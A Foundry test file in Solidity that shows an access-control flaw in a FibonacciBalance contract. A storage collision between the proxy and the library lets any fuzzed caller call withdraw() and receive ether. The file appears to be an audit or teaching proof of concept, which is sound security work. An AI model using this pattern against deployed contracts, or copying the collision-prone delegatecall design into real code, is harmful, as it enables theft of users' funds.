
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {FibonacciBalance, FibonacciLib} from "../src/FibonacciBalance.sol";

contract TestAccessControlFibonacciBalance is Test {

    FibonacciBalance public fibonacciBalance;
    FibonacciLib public fibonacciLib;

    function setUp() public {
        fibonacciLib = new FibonacciLib();
        fibonacciBalance = new FibonacciBalance(address(fibonacciLib));

        // Due to a storage collision between the proxy and the library, the 'start' variable
        // reads the library address, resulting in a massive calculated withdrawal amount.
        // We fund the contract with maximum ETH to ensure the transfer in withdraw() does not revert due to lack of funds.
        vm.deal(address(fibonacciBalance), type(uint256).max);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // --- 2. State Configuration ---
        // Reset caller balance to 0 to cleanly verify receipt of funds
        vm.deal(caller, 0);

        // --- 3. Execution & Assertion ---
        vm.prank(caller);
        fibonacciBalance.withdraw();
        
        // Assert that the caller successfully withdrew funds
        assertGt(caller.balance, 0);
    }
}
